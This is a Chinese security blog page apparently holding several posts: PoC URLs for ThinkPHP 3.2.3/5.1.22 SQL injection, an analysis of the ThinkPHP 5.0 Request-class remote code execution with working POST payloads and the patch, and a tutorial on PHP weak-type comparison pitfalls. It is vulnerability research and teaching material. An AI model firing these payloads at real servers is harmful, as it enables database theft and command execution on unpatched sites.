<h3 id="7-Thinkphp3-2-3-find-select-delete注入【20180823】"><a href="#7-Thinkphp3-2-3-find-select-delete注入【20180823】" class="headerlink" title="7)    Thinkphp3.2.3 find/select/delete注入【20180823】"></a>7)    Thinkphp3.2.3 find/select/delete注入【20180823】</h3><h4 id="漏洞测试代码：-2"><a href="#漏洞测试代码：-2" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function sqlvul1()</span><br><span class="line">   &#123;</span><br><span class="line">      $res = M(&apos;user&apos;)-&gt;find(I(&apos;GET.id&apos;));</span><br><span class="line">      //$res = M(&apos;user&apos;)-&gt;delete(I(&apos;GET.id&apos;));</span><br><span class="line">      //$res = M(&apos;user&apos;)-&gt;select(I(&apos;GET.id&apos;));</span><br><span class="line">      var_dump($res);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>正常请求：<br><a href="http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2</a></p>
<h4 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[alias]=where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- #需要知道表明 这里表名的user</span><br></pre></td></tr></table></figure>
<p><img src="/images/ThinkPHP-VUL-SUM20190111-71.png" alt=""> </p>
<h3 id="8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】"><a href="#8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】" class="headerlink" title="8)    ThinkPHP 3.2.3/5.1.22 order by注入【20180902】"></a>8)    ThinkPHP 3.2.3/5.1.22 order by注入【20180902】</h3><p>ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。【CVE-2018-16385】</p>
<h4 id="ThinkPHP3-2-3漏洞测试代码："><a href="#ThinkPHP3-2-3漏洞测试代码：" class="headerlink" title="ThinkPHP3.2.3漏洞测试代码："></a>ThinkPHP3.2.3漏洞测试代码：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    public function sqlvul2()&#123;</span><br><span class="line">    $data=array();</span><br><span class="line">    $data[&apos;username&apos;]=array(&apos;eq&apos;,&apos;qq123&apos;);</span><br><span class="line">    $order=I(&apos;get.order&apos;);//使用标准的I函数进行安全过滤</span><br><span class="line">    $m=M(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">    var_dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ThinkPHP3-2-3-POC"><a href="#ThinkPHP3-2-3-POC" class="headerlink" title="ThinkPHP3.2.3 POC"></a>ThinkPHP3.2.3 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)]</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul2?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure>
<p><img src="/images/ThinkPHP-VUL-SUM20190111-81.png" alt=""> </p>
<h4 id="ThinkPHP5-1-22漏洞测试代码"><a href="#ThinkPHP5-1-22漏洞测试代码" class="headerlink" title="ThinkPHP5.1.22漏洞测试代码"></a>ThinkPHP5.1.22漏洞测试代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">$data=array();</span><br><span class="line">$data[&apos;username&apos;]=array(&apos;eq&apos;,&apos;admin&apos;);</span><br><span class="line">$order=input(&apos;get.order&apos;);//使用input函数进行安全过滤</span><br><span class="line">$m=db(&apos;user&apos;)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">dump($m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ThinkPHP5-1-22-POC"><a href="#ThinkPHP5-1-22-POC" class="headerlink" title="ThinkPHP5.1.22 POC"></a>ThinkPHP5.1.22 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5/public/index/index/test/index?order[id`|updatexml(1,concat(0x3a,user()),1)%23]=1</span><br></pre></td></tr></table></figure>
<p><strong>参考:</strong><br><a href="http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/" target="_blank" rel="noopener">http://www.lsablog.com/networksec/penetration/thinkphp5-rce-analysis/</a><br><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-086737.html</a><br><a href="https://xz.aliyun.com/t/125" target="_blank" rel="noopener">https://xz.aliyun.com/t/125</a><br><a href="https://xz.aliyun.com/t/2631" target="_blank" rel="noopener">https://xz.aliyun.com/t/2631</a><br><a href="https://xz.aliyun.com/t/2257" target="_blank" rel="noopener">https://xz.aliyun.com/t/2257</a><br><a href="https://xz.aliyun.com/t/2812" target="_blank" rel="noopener">https://xz.aliyun.com/t/2812</a><br><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104847</a><br><a href="http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://galaxylab.org/thinkphp-3-x-5-x-order-by%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a><br><a href="https://www.freebuf.com/vuls/185420.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/185420.html</a> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞分析20190111/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/16/ThinkPHP5.0Request类远程命令执行漏洞分析20190111/" itemprop="url">ThinkPHP5.0 Request类远程命令执行漏洞分析20190111</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-16T21:20:32+08:00">
                2019-02-16
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1)    漏洞简介"></a>1)    漏洞简介</h3><p>2019年1月11日，ThinkPHP团队发布了一个补丁更新，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。该漏洞危害程度非常高，默认安装条件下即远程命令执行。受影响的版本为ThinkPHP 5.0.0 - ThinkPHP 5.0.23完整版。</p>
<p>ThinkPHP 5.0.15【thinkphp/library/think/Request.php】：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Source: Request类的method() 方法中的：</span><br><span class="line">$this-&gt;method = strtoupper($_POST[Config::get(&apos;var_method&apos;)]);</span><br><span class="line">$this-&gt;&#123;$this-&gt;method&#125;($_POST);</span><br><span class="line"></span><br><span class="line">Sink: Request类的filterValue() 方法中的回调函数：</span><br><span class="line">call_user_func($filter, $value)</span><br></pre></td></tr></table></figure></p>
<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2)    漏洞复现"></a>2)    漏洞复现</h3><h4 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15  POC:"></a>ThinkPHP 5.0.15  POC:</h4><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
<h4 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23  POC:"></a>ThinkPHP 5.0.23  POC:</h4><p>下面POC  在debug模式无论关闭或开启均可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5023/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
<h3 id="3-漏洞分析-ThinkPHP-5-0-15"><a href="#3-漏洞分析-ThinkPHP-5-0-15" class="headerlink" title="3)    漏洞分析(ThinkPHP 5.0.15)"></a>3)    漏洞分析(ThinkPHP 5.0.15)</h3><h4 id="github-commit信息"><a href="#github-commit信息" class="headerlink" title="github commit信息"></a>github commit信息</h4><p>首先看下官方github commit信息<br><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br>library/think/Request.php的public function method($method = false)方法<br><img src="/images/ThinkPHP-RCE20190111-11.png" alt=""></p>
<h4 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h4><p>以官网下载的ThinkPHP 5.0.15完整版进行分析，首先定位到漏洞关键点：<br>漏洞主要出现在Request 类的method 函数中<br>thinkphp5015\thinkphp/library/think/Request.php:501<br><img src="/images/ThinkPHP-RCE20190111-21.png" alt=""></p>
<p>method()函数可以用来获取当前请求类型，如 GET、POST 等，当传入参数$method为false 的时候，会通过var_method 来配置$method</p>
<p>508行method函数引入了一个外部可控的数据$_POST[Config::get[‘var_method’]。<br>在thinkphp5015\application\config.php中，可看到 ‘var_method’ 是表单请求伪变量，其默认值为 ‘_method’：<br><img src="/images/ThinkPHP-RCE20190111-22.png" alt=""></p>
<p>取得$_POST[‘_method’]的值并将其赋值给$this-&gt;method，然后动态调用$this-&gt;{$this-&gt;method}($_POST)。这意味着攻击者可利用POST 参数可以实现对当前类的任意方法进行调用，通过调用当前类的构造方法可以实现任意覆盖成员属性的值。如果动态调用__construct构造函数，可以实现任意覆盖成员属性的值则会导致代码执行。</p>
<p>在构造函数中，会判断其传入参数的key是否是该类属性，如果是，则将对应的value赋值给该属性，可以进行变量覆盖：<br><img src="/images/ThinkPHP-RCE20190111-23.png" alt=""> </p>
<p>当method被赋值为construct之后，即$method参数为true 时，会通过server() 函数进入Request类的param()函数，进而input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br>最终调用filterValue()中的回调函数call_user_func() 实现任意命令执行</p>
<p>当$method参数为true，进入server()：<br><img src="/images/ThinkPHP-RCE20190111-24.png" alt=""></p>
<p>进入param()<br><img src="/images/ThinkPHP-RCE20190111-25.png" alt=""></p>
<p>进入input() &gt;&gt; getFilter() &gt;&gt; filterValue()<br><img src="/images/ThinkPHP-RCE20190111-26.png" alt=""></p>
<p>1008行 array_walk_recursive($data, [$this, ‘filterValue’], $filter);<br>利用回调函数array_walk_recursive，进入filterValue()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：array_walk_recursive ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</span><br><span class="line">将用户自定义函数 callback 应用到 array 数组中的每个单元</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/ThinkPHP-RCE20190111-27.png" alt=""><br>1065行  call_user_func($filter, $value)  利用回调函数call_user_func() 触发漏洞，执行命令。</p>
<h4 id="动态代码分析"><a href="#动态代码分析" class="headerlink" title="动态代码分析"></a>动态代码分析</h4><p>测试POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/public/index.php HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
<p>加断点:<br><img src="/images/ThinkPHP-RCE20190111-31.png" alt=""></p>
<p>__construct构造函数:<br><img src="/images/ThinkPHP-RCE20190111-32.png" alt=""></p>
<p>Request.php类的method(),method设为了__construct:<br><img src="/images/ThinkPHP-RCE20190111-33.png" alt=""></p>
<p>$method为true，进入server():<br><img src="/images/ThinkPHP-RCE20190111-34.png" alt=""></p>
<p>进入param():<br><img src="/images/ThinkPHP-RCE20190111-35.png" alt=""></p>
<p>return时进入input():<br><img src="/images/ThinkPHP-RCE20190111-36.png" alt=""></p>
<p>进入getFilter()，并通过回调函数array_walk_recursive()进入filterValue()<br><img src="/images/ThinkPHP-RCE20190111-37.png" alt=""></p>
<p>filterValue()中利用回调函数call_user_func() 触发漏洞，执行命令：<br><img src="/images/ThinkPHP-RCE20190111-38.png" alt=""></p>
<h3 id="4-补丁中的修复方式"><a href="#4-补丁中的修复方式" class="headerlink" title="4)    补丁中的修复方式"></a>4)    补丁中的修复方式</h3><p><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003?diff=split</a><br><img src="/images/ThinkPHP-RCE20190111-41.png" alt=""></p>
<p>对$method增加白名单，限制为GET, POST, DELETE, PUT, PATCH<br>无法再调用__construct构造函数</p>
<p><strong>参考:</strong><br><a href="https://nosec.org/home/detail/2163.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2163.html</a><br><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a>  </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/12/PHP弱类型/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/12/PHP弱类型/" itemprop="url">PHP弱类型</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-12T18:17:34+08:00">
                2019-02-12
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>PHP 属于弱类型语言， PHP 不必声明该变量的数据类型，PHP 会根据变量的值自动把变量的值转换为所需的数据类型，但在这个自动转换过程中可能存在安全问题。<br>常见可能导致弱类型漏洞的有：1)==   2)switch()   3)in_array()    4)array_search()  5)is_number()   6)strcmp()  7)Magic Hashes</p>
<h3 id="1-比较运算符-与"><a href="#1-比较运算符-与" class="headerlink" title="1)    比较运算符==与==="></a>1)    比较运算符==与===</h3><p><a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">http://php.net/manual/zh/types.comparisons.php</a> </p>
<p>Loose comparisons with ==    松散比较 ==<br>Strict comparisons with ===  严格比较 ===<br>在松散比较时，PHP会将类型进行强制转换。一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换规则：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。 两个字符串比较，如果两个都是数字形式，则同时转换为数字进行比较。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a == $b	等于     TRUE，如果类型转换后 $a 等于 $b。</span><br><span class="line">$a === $b	全等     TRUE，如果 $a 等于 $b，并且它们的类型也相同。</span><br><span class="line">$a != $b	不等     TRUE，如果类型转换后 $a 不等于 $b。</span><br><span class="line">$a &lt;&gt; $b	不等     TRUE，如果类型转换后 $a 不等于 $b。</span><br><span class="line">$a !== $b	不全等   TRUE，如果 $a 不等于 $b，或者它们的类型不同。</span><br></pre></td></tr></table></figure>
<h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&apos;abc&apos; == 0); //true</span><br><span class="line">var_dump(&apos;123abc&apos; == 123); //true</span><br><span class="line">var_dump(&apos;1&apos; == 1); //true</span><br><span class="line">var_dump(&apos;1&apos; == true); //true</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">var_dump(&quot;1&quot; == &quot;01&quot;); //  true  </span><br><span class="line">var_dump(&apos;1&apos; === 1); //false  //严格比较</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实例-DedeCMS-20180109-任意用户密码重置"><a href="#实例-DedeCMS-20180109-任意用户密码重置" class="headerlink" title="实例-DedeCMS(20180109)任意用户密码重置"></a>实例-DedeCMS(20180109)任意用户密码重置</h4><p><a href="http://blog.nsfocus.net/dedecms-20180109/" target="_blank" rel="noopener">http://blog.nsfocus.net/dedecms-20180109/</a>  DedeCMS最新版(20180109)任意用户密码修改</p>
<h3 id="2-switch"><a href="#2-switch" class="headerlink" title="2)    switch()"></a>2)    switch()</h3><p><a href="http://us1.php.net/manual/zh/control-structures.switch.php" target="_blank" rel="noopener">http://us1.php.net/manual/zh/control-structures.switch.php</a><br>switch/case 是松散比较(loose comparison)。当switch case是数字类型时，switch会先将其中的参数转换为int类型</p>
<h4 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i =&quot;2lltest&quot;;</span><br><span class="line">switch ($i) &#123;</span><br><span class="line">	case 1:</span><br><span class="line">		echo &quot;1&quot;;</span><br><span class="line">	case 2:</span><br><span class="line">		echo $i;  </span><br><span class="line">    //输出2lltest</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实例-HDWIKI鸡肋SQL注入"><a href="#实例-HDWIKI鸡肋SQL注入" class="headerlink" title="实例-HDWIKI鸡肋SQL注入"></a>实例-HDWIKI鸡肋SQL注入</h4><p><a href="https://www.secpulse.com/archives/30532.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/30532.html</a> HDWIKI鸡肋SQL注入（PHP弱类型实例）</p>
<h3 id="3-in-array"><a href="#3-in-array" class="headerlink" title="3)    in_array()"></a>3)    in_array()</h3><p><a href="http://php.net/manual/en/function.in-array.php" target="_blank" rel="noopener">http://php.net/manual/en/function.in-array.php</a><br>in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool<br>in_array 检查数组中是否存在某个值。在数组haystack中搜索needle是否存在，如果没有设置 strict为true时 则使用松散比较。</p>
<h4 id="示例1-2"><a href="#示例1-2" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//in_array()如果没有设置第三个参数为true  则松散比较</span><br><span class="line">$a = array(0,1,2,7,&apos;9&apos;);</span><br><span class="line">var_dump(in_array(&apos;7lltest.php&apos;, $a));//返回true  #7lltest.php被强制转换成整型 7</span><br><span class="line">var_dump(in_array(&apos;lltest.php&apos;, $a));//返回true  #lltest.php被强制转换成整型 0</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">var_dump(in_array(&apos;7lltest.php&apos;, $a, true));//返回false</span><br><span class="line">var_dump(in_array(&apos;lltest.php&apos;, $a, true));//返回false</span><br><span class="line">#如果第三个参数设置为 true，只有当元素存在于数组中且数据类型与给定值相同时才返回 true。</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实例-免费开源相册Piwigo-lt-v2-7-1-SQL注入"><a href="#实例-免费开源相册Piwigo-lt-v2-7-1-SQL注入" class="headerlink" title="实例-免费开源相册Piwigo&lt;= v2.7.1 SQL注入"></a>实例-免费开源相册Piwigo&lt;= v2.7.1 SQL注入</h4><p><a href="https://www.freebuf.com/articles/web/55075.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/55075.html</a> 免费开源相册Piwigo&lt;= v2.7.1 SQL注入漏洞分析</p>
<h3 id="4-array-search"><a href="#4-array-search" class="headerlink" title="4)    array_search()"></a>4)    array_search()</h3><p>array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) : mixed<br>array_search — 在数组中搜索给定的值，如果成功则返回首个相应的键名，否则返回 FALSE。如果没有设置 strict为true时 则使用松散比较。</p>
<h4 id="示例1-3"><a href="#示例1-3" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//array_search()如果没有设置第三个参数为true  则松散比较</span><br><span class="line">$array=array(0,1);</span><br><span class="line">var_dump(array_search(&apos;test.php&apos;, $array));  //0</span><br><span class="line">var_dump(array_search(&apos;1test.php&apos;, $array));  //1</span><br><span class="line">var_dump(array_search(&apos;7test.php&apos;, $array));  //false</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="5-is-number"><a href="#5-is-number" class="headerlink" title="5)    is_number()"></a>5)    is_number()</h3><p>is_numeric ( mixed $var ) : bool<br>is_numeric 检测变量是否为数字或数字字符串。如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。<br>而如果该值是0x十六进制格式，同样会返回TRUE，就可能存在二次注入等问题。</p>
<h4 id="示例1-4"><a href="#示例1-4" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = &apos;0x3120616e6420313d31&apos;;</span><br><span class="line">if (is_numeric($id))&#123;	</span><br><span class="line">	$sql = &quot;select * from user where id = $id&quot;;</span><br><span class="line">	echo $sql;	</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;$id is not number&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实例-phpyun注入漏洞"><a href="#实例-phpyun注入漏洞" class="headerlink" title="实例-phpyun注入漏洞"></a>实例-phpyun注入漏洞</h4><p><a href="http://www.anquan.us/static/bugs/wooyun-2015-0122884.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2015-0122884.html</a> </p>
<h3 id="6-strcmp"><a href="#6-strcmp" class="headerlink" title="6)    strcmp()"></a>6)    strcmp()</h3><p><a href="http://php.net/manual/zh/function.strcmp.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.strcmp.php</a><br>strcmp ( string $str1 , string $str2 ) : int<br>strcmp 字符串比较。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>在PHP &gt;=5.3版本中，strcmp($_GET[‘pass’], $password) == 0，当GET请求xxx.php?pass[]=xxx 时，由于类型不符合，发生错误，但还是判断其相等 返回0</p>
<h4 id="示例1-5"><a href="#示例1-5" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Vulnerability (in PHP &gt;=5.3)</span><br><span class="line">//测试版本: PHP Version 5.3.29</span><br><span class="line">       $password=&quot;123456&quot;;</span><br><span class="line">       if (strcmp($_GET[&apos;pass&apos;], $password) == 0) &#123;</span><br><span class="line">              echo &quot;Success&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">//GET请求: xxx.php?pass[]=xxx     类型不符合，发生错误，但还是判断其相等 返回0</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
